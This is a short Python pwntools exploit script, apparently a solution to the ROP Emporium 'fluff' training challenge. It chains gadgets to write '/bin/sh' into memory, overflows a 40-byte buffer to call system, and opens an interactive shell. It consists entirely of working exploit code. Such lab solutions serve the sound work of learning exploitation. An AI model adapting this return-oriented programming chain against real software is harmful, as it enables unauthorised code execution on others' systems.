from pwn import *

system_plt = 0x4005e0

def write_to_addr(data, address):
    #Put address in r10
    seq = ''
    seq += p64(0x400822) # xor r11,r11 ; pop r14 ; mov edi,0x601050 ; ret
    seq += 'junkjunk'
    seq += p64(0x400832) # pop r12 ; mov r13d, 0x604060 ; ret
    seq += p64(address)
    seq += p64(0x40082f) # xor r11,r12 ; pop r12 ; mov r13d,0x604060 ; ret
    seq += 'junkjunk'
    seq += p64(0x400840) # xchg r11,r10; pop r15; mov r11d,0x602050; ret
    seq += 'junkjunk'
    
    # Put data in r11
    seq += p64(0x400822) # xor r11,r11 ; pop r14 ; mov edi,0x601050 ; ret
    seq += 'junkjunk'
    seq += p64(0x400832) # pop r12 ; mov r13d, 0x604060 ; ret
    seq += data
    seq += p64(0x40082f) # xor r11,r12 ; pop r12 ; mov  r13d,0x604060 ; ret 
    seq += 'junkjunk'
    
    # Write r11 ro r10
    seq += p64(0x40084c) # pop r15; mov QWORD PTR [r10],r11; 
                         # pop r13; pop r12; xor    BYTE PTR [r10],r12b ret 
    seq += 'junkjunk' * 2
    seq += p64(0)
    
    return seq

# RIP offset is at 40
rop = "A" * 40

rop += write_to_addr('/bin/sh\x00', 0x601050)
rop += p64(system_plt)

# Start process and send rop chain
e = process('fluff')
print e.recv()
e.sendline(rop)
e.interactive()
